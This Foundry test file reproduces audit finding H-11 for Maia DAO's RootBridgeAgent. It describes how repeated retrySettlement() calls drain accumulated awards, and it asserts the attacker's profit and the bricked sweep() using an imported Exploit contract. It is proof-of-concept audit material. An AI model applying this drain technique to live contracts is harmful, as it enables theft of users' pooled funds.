// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./26045-h-11-an-attacker-can-steal-accumulated-awards-from-rootbridg.sol";

/*//////////////////////////////////////////////////////////////
    Maia DAO — [H-11] An attacker can steal Accumulated Awards from
    RootBridgeAgent by abusing retrySettlement(). Finding 26045
    (Code4rena 2023-05, reporter Voyvoda) — HIGH

    userFeeInfo.gasToBridgeOut is set once per anyExecute but never reset between
    retries, so N retrySettlement() calls each pull the same gasToBridgeOut out of
    the Root reserve. The attacker pays for one bridge-out, funds N, and pockets the
    (N-1) difference from the accumulated awards; the reserve then no longer matches
    accumulatedFees and sweep() bricks.
//////////////////////////////////////////////////////////////*/
contract MaiaRetrySettlementDrainTest is Test {
    Exploit exp;

    function setUp() public {
        exp = new Exploit();
    }

    function test_control_singleRetry_isFair() public {
        // Control: with ONE retry (as the code intends), the attacker's payment exactly
        // funds one bridge-out — no reserve is stolen.
        WrappedNative weth = new WrappedNative();
        RootBridgeAgent agent = new RootBridgeAgent(1, weth, address(this));
        agent.setBranchRefundSink(address(this));

        weth.mint(address(this), 100 ether);
        weth.approve(address(agent), type(uint256).max);
        agent.seedReserve(100 ether);
        weth.mint(address(this), 1 ether); // single stake

        agent.seedFailedSettlement(1, address(this), 2, 1 ether);

        uint256 start = weth.balanceOf(address(this));
        uint32[] memory nonces = new uint32[](1);
        nonces[0] = 1;
        agent.anyExecuteRetryBatch(nonces, 1 ether, 1 ether);
        uint256 end = weth.balanceOf(address(this));

        // pays 1, gets 1 back (its own single bridge-out) -> no profit, reserve intact.
        assertEq(end, start, "single retry is fair");
        assertEq(weth.balanceOf(address(agent)), 100 ether, "reserve untouched");
    }

    function test_batchRetry_steals_accumulatedAwards() public {
        exp.run();

        uint256 profit = exp.attackerEnd() - exp.attackerStart();
        emit log_named_uint("attacker start (WETH)", exp.attackerStart());
        emit log_named_uint("attacker end   (WETH)", exp.attackerEnd());
        emit log_named_uint("profit (WETH)", profit);
        emit log_named_uint("Root reserve end (WETH)", exp.reserveEnd());
        emit log_named_uint("accumulatedFees book", exp.accumulatedFeesBook());

        // Fund theft: attacker paid for 1 bridge-out, funded 3, netting (3-1)*1 = 2 WETH.
        assertEq(profit, 2 ether, "attacker stole (N-1)*gasToBridgeOut from the awards");
        assertGt(exp.attackerEnd(), exp.attackerStart(), "attacker profits");

        // Bricked awards: reserve is now short of the booked accumulatedFees.
        assertLt(exp.reserveEnd(), exp.accumulatedFeesBook(), "reserve short of book");
        assertTrue(exp.sweepBricked(), "sweep bricks on the mismatch");
    }
}
